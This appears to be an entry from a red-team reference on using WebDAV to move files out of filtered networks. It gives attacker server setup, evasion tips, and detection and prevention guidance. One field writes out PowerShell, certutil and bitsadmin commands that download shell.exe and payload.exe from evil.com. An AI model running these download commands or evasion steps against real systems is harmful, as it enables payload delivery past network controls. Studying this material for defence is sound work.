notes: WebDAV (wsgidav / Apache) gives a writable HTTP share Windows can map (`net use`) - handy when SMB is filtered but HTTP is allowed. Also an exec vector for some CVEs.

recommended.note: Plain HTTP cradle if WebDAV isn't needed.

name: WebDAV - Transfer
description: WebDAV over HTTP is often allowed out of restrictive networks where SMB is blocked. Host a WebDAV share and access it from Windows via the DavWWWRoot UNC path.

steps.label: 1. Start WebDAV server (attacker)
steps.command:
sudo pip3 install wsgidav cheroot
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous

variations.caption: Upload file via smbclient (when SMB is available)
variations.label: smbclient

defense.why_it_works: WebDAV serves files over HTTP(S) with PUT/GET, so a Windows target can map \\attacker\DavWWWRoot and copy files - transfer over web ports (80/443) that are usually allowed outbound.
defense.prerequisites: An attacker WebDAV server (e.g. wsgidav) and the target able to reach it over 80/443; WebClient service on Windows.
defense.impact: Files transferred over HTTP(S) via UNC paths, using commonly-allowed web ports to bypass port-based filtering.
defense.detection: WebDAV shows as HTTP PUT/GET to an external host and a mounted \\...\DavWWWRoot; the WebClient service starting is itself a signal; new file on disk.
defense.artifacts: HTTP PUT/PROPFIND to the attacker; a mapped DavWWWRoot; WebClient service start; the transferred file.
defense.prevention: [MITRE T1105 M1037] Web filtering/domain whitelisting; disable the WebClient service where not needed; alert on WebDAV method use and external UNC mounts.
defense.evasion: WebDAV rides allowed web ports (80/443); use HTTPS and an allowed-looking domain to blend with normal web traffic.
defense.misconfiguration: Target systems allow arbitrary file downloads via curl, wget, certutil, bitsadmin, or PowerShell Invoke-WebRequest without application allowlisting or egress filtering. Attackers use these native tools (LOLBins) to fetch payloads from attacker-controlled servers, bypassing endpoint protection that might detect known malicious tool names.
defense.vulnerable_config:
# Living-off-the-land file download methods (all built into Windows/Linux):
# PowerShell (often bypasses older AV):
(New-Object Net.WebClient).DownloadFile('http://evil.com/shell.exe', 'C:\Temp\shell.exe')

# certutil (trusted Microsoft binary, often not blocked):
certutil -urlcache -split -f http://evil.com/payload.exe payload.exe

# bitsadmin (background transfer service):
bitsadmin /transfer myJob http://evil.com/shell.exe C:\Temp\shell.exe

# All of these bypass controls that only look for 'nc.exe', 'mimikatz.exe', etc.
defense.secure_config:
# Application allowlisting (most effective):
# Windows Defender Application Control (WDAC) or AppLocker
# Only signed, approved executables run
# Blocks dropping and running arbitrary payloads even via LOLBins

# PowerShell Constrained Language Mode + AMSI:
# GPO: PowerShell Execution Policy = AllSigned
# Blocks unsigned scripts; AMSI scans all scripts before execution

# Egress filtering — block outbound to unknown IPs:
# Web proxy with allowlist for legitimate update sources
# Alert on: certutil with -urlcache flag (Event 4688 + command line audit)
# Sysmon Rule: ProcessCreate where Image = certutil.exe and CommandLine contains 'urlcache'

# Network IDS: alert on HTTP/HTTPS downloads initiated by certutil, bitsadmin process
# Defender ATP: 'Suspicious process using Certutil to download content'
